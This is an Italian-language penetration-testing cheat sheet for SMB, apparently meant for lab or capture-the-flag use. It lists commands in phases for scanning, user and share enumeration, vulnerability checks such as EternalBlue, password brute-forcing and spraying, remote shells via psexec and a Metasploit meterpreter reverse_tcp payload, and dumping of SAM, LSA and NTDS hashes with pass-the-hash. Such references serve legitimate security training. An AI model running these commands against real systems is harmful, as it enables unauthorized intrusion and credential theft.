# SMB — Server Message Block
**Porte:** 445 (SMB/CIFS), 137-139 (NetBIOS legacy)  
**Categoria:** Trasferimento File

Protocollo per la condivisione di file, stampanti e risorse in rete.
Pilastro delle reti Windows. Su Linux si usa Samba (demoni: smbd + nmbd).

Versioni: CIFS (NT4) → SMB 1.0 (2000) → SMB 2.0 (Vista) → SMB 3.1.1 (Win10+).
La porta 445 è lo standard moderno; le porte 137-139 sono legacy NetBIOS.

ACL (Access Control Lists) regolano chi può leggere/scrivere/eseguire.
Le share possono mostrare una gerarchia diversa dal disco fisico del server.

## Configurazione

- Config Samba (Linux): /etc/samba/smb.conf
- Vedere config attiva: cat /etc/samba/smb.conf | grep -v '#\|;'
- Riavviare dopo modifiche: sudo systemctl restart smbd
- Sezioni: [global] per regole generali, [nome_share] per ogni condivisione

## Vulnerabilità comuni

- Null Session — accesso anonimo senza credenziali (-N)
- guest ok = yes — condivisioni aperte a tutti senza password
- browseable = yes — share visibili a chiunque interroghi il server
- read only = no / writable = yes — scrittura permessa (upload web shell)
- create mask = 0777 — permessi massimi su file creati (RWX per tutti)
- logon script / magic script — se sovrascrivibili → RCE (Remote Code Execution)
- EternalBlue (MS17-010) — RCE su SMBv1 senza autenticazione (WannaCry/NotPetya)
- Enumerazione utenti via RPC (rpcclient, samrdump) — mappa tutti gli utenti del dominio

---

## Fase 1 — Scan & Rilevamento

```bash
# Verifica raggiungibilità
ping -c 4 <IP>

# Scan base con versione e script di default
nmap -sV -sC -p445 <IP>                              # Rivela OS, SMB security mode, hostname
sudo nmap -sV -sC -p139,445 <IP>                     # Includi anche NetBIOS legacy

# NSE — Info e rilevamento
sudo nmap --script smb-os-discovery -p445 <IP>        # OS, hostname, dominio, workgroup, FQDN
sudo nmap --script smb-protocols -p445 <IP>           # Versioni SMB supportate (1.0, 2.0, 3.x)
sudo nmap --script smb-security-mode -p445 <IP>       # Message signing (required/enabled/disabled)
sudo nmap --script smb-system-info -p445 <IP>         # Info dettagliate OS e hardware
sudo nmap --script smb-server-stats -p445 <IP>        # Statistiche server (richieste, errori, byte)
```

## Fase 2 — Enumerazione

### ELENCO SHARE

```bash
smbclient -N -L //<IP>                               # Elenca share (null session, senza password)
smbclient //<IP>/<share>                              # Accedi a una share specifica
smbclient -U username //<IP>/<share>                  # Accedi con uno username
  > !cat flag.txt                                     # '!' esegue comandi sul TUO PC senza uscire
smbmap -H <IP>                                        # Mappa permessi READ/WRITE su ogni share
smbmap -H <IP> -u 'user' -p 'pass'                    # Con credenziali specifiche
smbmap -H <IP> -r 'share_name'                        # Elencare file in una share
smbmap -H <IP> --download 'share_name\file.txt'       # Scaricare un file dalla share
```

### ENUMERAZIONE UTENTI & GRUPPI

```bash
# enum4linux-ng — All-in-one (sessione anonima)
enum4linux-ng.py <IP> -A                              # Enumerazione completa: porte, utenti, gruppi, share, policy password

# enum4linux-ng — Con credenziali (più risultati)
enum4linux-ng.py -u 'user' -p 'pass' -U <IP>         # Enumera utenti con credenziali note

# NetExec
nxc smb <IP> --shares -u '' -p ''                     # Enum share anonime
nxc smb <IP> --users -u 'user' -p 'pass'              # Enumera utenti con credenziali
nxc smb <IP> --groups -u 'user' -p 'pass'             # Enumera gruppi
nxc smb <IP> --pass-pol -u 'user' -p 'pass'           # Policy password (lockout, min length)
nxc smb <SUBNET>/24                                   # Scopri host SMB nella subnet
```

### ENUMERAZIONE RPC (rpcclient)

```bash
rpcclient -U '' <IP>                                  # Sessione RPC anonima
rpcclient -U 'user%pass' <IP>                         # Sessione RPC con credenziali
  > srvinfo                                           # Info server (nome, versione OS)
  > enumdomains                                       # Elenca tutti i domini nella rete
  > querydominfo                                      # Info dominio, server e utenti
  > enumdomusers                                      # Lista utenti dominio con RID
  > netshareenumall                                   # Lista tutte le share (anche nascoste)
  > netsharegetinfo <share>                           # Dettagli su una share specifica
  > queryuser <RID>                                   # Info su utente specifico (per RID)
  > querygroup <RID>                                  # Info su gruppo specifico
```

### BRUTE FORCE RID (se enumerazione bloccata)

```bash
for i in $(seq 500 1100);do rpcclient -N -U '' <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep 'User Name' && echo '';done
samrdump.py <IP>                                      # Alternativa Python (Impacket)
```

### NMAP NSE — SCRIPT SMB

```bash
# Enumerazione
sudo nmap --script smb-enum-shares -p445 <IP>         # Elenca tutte le share con permessi
sudo nmap --script smb-enum-users -p445 <IP>          # Elenca utenti del dominio/macchina
sudo nmap --script smb-enum-groups -p445 <IP>         # Elenca gruppi (Administrators, Users...)
sudo nmap --script smb-enum-sessions -p445 <IP>       # Sessioni attive (chi è connesso ora)
sudo nmap --script smb-enum-services -p445 <IP>       # Servizi Windows in esecuzione
sudo nmap --script smb-enum-domains -p445 <IP>        # Domini + policy password (lockout, min length)
sudo nmap --script smb-enum-processes -p445 <IP>      # Processi in esecuzione (richiede admin)
sudo nmap --script smb-ls --script-args 'smbusername=user,smbpassword=pass' -p445 <IP>
                                                      # Lista file dentro le share (come ls -R)

# Combo — tutto insieme
sudo nmap --script 'smb-enum-*' -p445 <IP>            # Tutti gli script di enumerazione
```

## Fase 3 — Vulnerability Scan

```bash
# Vulnerabilità critiche
sudo nmap --script smb-vuln-ms17-010 -p445 <IP>       # EternalBlue (WannaCry) — RCE critica
sudo nmap --script smb-vuln-ms08-067 -p445 <IP>       # Conficker — RCE su XP/2003/Vista
sudo nmap --script smb-vuln-cve-2017-7494 -p445 <IP>  # SambaCry — RCE su Samba (Linux)
sudo nmap --script smb-vuln-webexec -p445 <IP>        # WebExec — RCE via WebExService
sudo nmap --script smb-double-pulsar-backdoor -p445 <IP>  # DoublePulsar backdoor (NSA leak)
sudo nmap --script smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms10-054,smb-vuln-ms10-061 -p445 <IP>
                                                      # Altre vuln legacy (RasRPC, Dns, DoS, Spooler)

# Combo
sudo nmap --script 'smb-vuln-*' -p445 <IP>            # Tutti i vulnerability check
sudo nmap --script 'smb-enum-*,smb-vuln-*,smb-os-discovery,smb-protocols,smb-security-mode' -p445 <IP>
                                                      # Scan completo: enum + vuln + info
```

## Fase 4 — Brute-Force Credenziali

```bash
# Hydra — brute-force SMB
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <IP> smb
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt <IP> smb
hydra -L users.txt -P passwords.txt <IP> smb          # Più utenti + wordlist password
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb -t 4  # Limita thread (evita lockout)

# NetExec — password spraying (stessa password su molti utenti)
nxc smb <IP> -u users.txt -p 'Password123!'           # Una password, molti utenti
nxc smb <SUBNET>/24 -u users.txt -p 'Password123!'    # Spraying su intera subnet
nxc smb <IP> -u users.txt -p passwords.txt            # Molti utenti × molte password
nxc smb <IP> -u users.txt -p passwords.txt --no-bruteforce  # Solo coppie 1:1 (user1:pass1, user2:pass2)

# Medusa
medusa -h <IP> -u admin -P passwords.txt -M smbnt -t 4

# Ncrack
ncrack -u admin -P passwords.txt smb://<IP>

# Nmap NSE
sudo nmap --script smb-brute -p445 <IP>               # Brute-force con dizionario integrato
```

## Fase 5 — Autenticazione & Accesso Remoto

### SMBCLIENT (accesso file)

```bash
smbclient -U 'administrator%vagrant' //<IP>/C$        # Accedi alla share C$ con credenziali
  > ls                                                 # Lista file
  > get file.txt                                       # Scarica file
  > put payload.exe                                    # Carica file
  > recurse ON; prompt OFF; mget *                     # Scarica tutto ricorsivamente
```

### PSEXEC — Shell remota via SMB

```bash
# Impacket psexec.py — ottieni shell interattiva come SYSTEM
psexec.py administrator@<IP>                           # Ti chiederà la password
psexec.py administrator:vagrant@<IP>                   # Password inline
psexec.py -hashes :<NTLM_HASH> administrator@<IP>     # Pass-the-Hash (senza password)

# Altri tool Impacket per exec remoto
wmiexec.py administrator:vagrant@<IP>                  # Exec via WMI (più stealth, no servizio)
smbexec.py administrator:vagrant@<IP>                  # Exec via SMB share (alternativa psexec)
atexec.py administrator:vagrant@<IP> 'whoami'          # Exec via Task Scheduler
```

### NETEXEC — Exec remoto e verifica credenziali

```bash
nxc smb <IP> -u 'administrator' -p 'vagrant'          # Verifica credenziali (Pwn3d! = admin locale)
nxc smb <IP> -u 'administrator' -p 'vagrant' -x 'whoami'       # Esecuzione comando
nxc smb <IP> -u 'administrator' -p 'vagrant' -x 'type C:\flag.txt'  # Leggi file
nxc smb <IP> -u 'administrator' -p 'vagrant' --exec-method smbexec  # Metodo alternativo
```

### METASPLOIT — PsExec + Meterpreter

```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <IP>
set SMBUser administrator
set SMBPass vagrant
set payload windows/x64/meterpreter/reverse_tcp
exploit
# → meterpreter session con accesso SYSTEM
```

### EVIL-WINRM (se porta 5985 aperta)

```bash
evil-winrm -i <IP> -u administrator -p vagrant
```

## Fase 6 — Post-Exploitation

```bash
# Dump hash SAM (richiede admin)
nxc smb <IP> -u 'administrator' -p 'vagrant' --sam    # Dump hash locali via NetExec
nxc smb <IP> -u 'administrator' -p 'vagrant' --lsa    # Dump LSA secrets
nxc smb <IP> -u 'administrator' -p 'vagrant' --ntds   # Dump NTDS.dit (Domain Controller)
secretsdump.py administrator:vagrant@<IP>              # Impacket: dump completo hash + secrets

# Pass-the-Hash — autentica con l'hash NTLM senza conoscere la password
nxc smb <IP> -u 'administrator' -H '<NTLM_HASH>'
psexec.py -hashes :<NTLM_HASH> administrator@<IP>
evil-winrm -i <IP> -u administrator -H '<NTLM_HASH>'

# Enumerazione post-accesso
nxc smb <IP> -u 'admin' -p 'pass' --shares            # Ri-enumera share con privilegi
nxc smb <IP> -u 'admin' -p 'pass' --sessions          # Chi è connesso
nxc smb <IP> -u 'admin' -p 'pass' --loggedon-users    # Utenti loggati
nxc smb <IP> -u 'admin' -p 'pass' --disks             # Dischi disponibili
```

## Monitoraggio (lato admin)

```bash
smbstatus                                              # Chi è connesso, versione protocollo, file lockati
```

---

## Tool consigliati

*Installa con `use <tool>` + `install` — apri la pagina tool con `use <tool>`*

### Enumerazione

| Tool | A cosa serve |
|------|-------------|
| **nmap** | Scan porte 139/445, script NSE per enum share/utenti/vuln |
| **enum4linux-ng** | Enumerazione all-in-one: utenti, gruppi, share, policy password, dialetti SMB |
| **smbmap** | Mappa permessi READ/WRITE su ogni share, download/upload file |
| **rpcclient** | Sessione RPC interattiva: enumdomusers, srvinfo, queryuser (già installato) |

### Attacco & Credential Testing

| Tool | A cosa serve |
|------|-------------|
| **netexec** | Coltellino svizzero: password spraying, enum share, exec comandi, dump SAM, pass-the-hash. Evoluzione di CrackMapExec, multi-protocollo (SMB/RDP/WinRM/LDAP/SSH/MSSQL) |
| **hydra** | Brute-force login SMB con wordlist username/password |
| **medusa** | Brute-force SMB parallelo, alternativa a Hydra |
| **ncrack** | Brute-force SMB/RDP/SSH ad alta velocità |
| **crackmapexec** | Predecessore di NetExec — stesso utilizzo, ma non più mantenuto. Usa `nxc` al suo posto |

### Accesso Remoto & Post-Exploitation

| Tool | A cosa serve |
|------|-------------|
| **impacket** | Suite Python: `psexec.py` (shell SYSTEM via SMB), `wmiexec.py` (exec via WMI), `smbexec.py` (exec via share), `secretsdump.py` (dump hash), `samrdump.py` (enum utenti), `atexec.py` (exec via Task Scheduler) |
| **smbclient** | Client SMB nativo Linux: accesso share, download/upload file, comandi locali con `!` (già installato) |
| **evil-winrm** | Shell PowerShell remota via WinRM (porta 5985) — upload/download file, caricamento script |
| **metasploit** | `exploit/windows/smb/psexec` → meterpreter session con accesso SYSTEM |
